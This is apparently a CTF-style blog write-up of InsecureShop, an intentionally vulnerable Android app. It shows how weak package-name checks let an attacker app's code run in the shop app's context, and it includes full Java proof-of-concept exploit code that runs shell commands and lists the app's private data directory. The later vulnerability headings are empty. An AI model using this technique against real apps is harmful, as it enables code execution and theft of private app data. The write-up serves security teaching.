---
title: "InsecureShop — Android App Exploitation, pt. 3"
date: 2022-04-06
category: "mobile"
tags: ["android", "ctf", "rce", "content-provider", "file-provider"]
summary: "Part 3: arbitrary code execution via third-party package context loading; vulnerabilities 16-18 listed as stubs."
source: "research"
draft: false
---

This will part will conclude the writeup series on insecure shop. Hopefully, I was able to impart some knowledge on how to exploit vulnerable components in android applications. 

## Vulnerability #15: Arbitrary Code Execution

Further examination of the onLogin functionality in the [LoginActivity](https://github.com/hax0rgb/InsecureShop/blob/main/app/src/main/java/com/insecureshop/LoginActivity.kt) shows that there is another branch which gets executed if the login attempt fails:

![](https://i.imgur.com/Ch0ILxI.png)

If we focus on the code block starting from line 51, we can see that the application iterates through the installed applications in the device and checks for apps whose package names begin with the prefix `com.insecureshopapp`. If it does find such an app, it tries to load the application's `MainInterface` class then calls the `getInstance` method. **This can be dangerous since the validation for choosing apps is very weak, an attacker application's code may be executed in the context of the insecure shop app**. 

To exploit this:
1. We need to create an app which satisfies the package name check:
![](https://i.imgur.com/W6N966S.png)

2. We need to implement the `MainInterface` class along with the method `getInstance(Context context)` which should return an instance of MainInterface. 
3. Develop the code which should be used to execute arbitrary commands:

```java
package com.insecureshopapp;

import android.content.Context;
import android.os.Build;
import android.util.Log;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;

public class MainInterface {

    public static void execCMD(String cmd) {
        try {
            Process process = Runtime.getRuntime().exec(cmd);
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));

            int read;
            char[] buffer = new char[4096];
            StringBuffer output = new StringBuffer();
            while ((read = reader.read(buffer)) > 0) {
                output.append(buffer, 0, read);
            }
            reader.close();
            process.waitFor();

            Log.d("SHOPEXPLOIT", String.format("%s:/ $ [%s]", Build.MODEL, cmd));
            Log.d("SHOPEXPLOIT", output.toString());
        } catch (Throwable th) {
            Log.d("SHOPEXPLOIT", th.toString());
        }
    }
    
    public static MainInterface getInstance(Context context) {
        try {
            Log.d("SHOPEXPLOIT", "app executing from the following context: " + context.toString());
            execCMD("whoami");
            execCMD("id");
            execCMD("ls -la /data/data/com.insecureshop");
        } catch (Throwable th) {
            Log.d("SHOPEXPLOIT", th.toString());
        }
        return new MainInterface();
    }

    @Override
    public String toString() {
        return "Hello from the exploit apk :)";
    }
}
```
{{< youtube Y9uBD1XtAk0 >}}

> A more detailed read for this vulnerability can be found at: https://blog.oversecured.com/Android-arbitrary-code-execution-via-third-party-package-contexts/

## Vulnerability #16: Insecure use of FilePaths in FileProvider

## Vulnerability #17: Insecure Implementation of SetResult in exported Activity

## Vulnerability #18: Theft of Arbitrary Files